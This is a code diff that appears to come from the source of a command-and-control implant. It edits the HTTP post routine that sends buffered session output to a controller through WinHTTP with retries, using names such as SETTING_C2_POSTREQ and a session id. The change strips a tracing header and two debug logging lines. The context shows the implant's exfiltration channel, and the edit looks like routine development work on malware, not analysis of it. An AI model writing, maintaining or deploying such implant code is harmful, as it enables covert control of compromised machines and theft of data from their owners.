@@ -12,7 +12,6 @@
 #include "track_memory.h"
 #include "hostprof.h"
 #include "channel_http_common.h"
-#include "spawn_trace.h"
 
 #pragma comment(lib, "winhttp")
 #pragma comment(lib, "ws2_32")
@@ -190,7 +189,6 @@ void http_post_maybe(char * hook) {
 	if (http_post_len == 0)
 		return;
 
-	spawn_log("postflush len=", (long)http_post_len);
 	_snprintf(myid, 128, "%d", bigsession.myid);
 	http_assemble_request(&myprofile, myuri, hook, SETTING_C2_POSTREQ,
 	                      myid, (int)strlen(myid), http_post_buffer, http_post_len, 1);
@@ -214,7 +212,6 @@ void http_post_maybe(char * hook) {
 		WinHttpCloseHandle(request);
 		Sleep(500);
 	}
-	spawn_log("postdone retry=", (long)retry);
 	profile_free(&myprofile, http_post_len);
 	http_post_len = 0;
 	token_guard_stop();
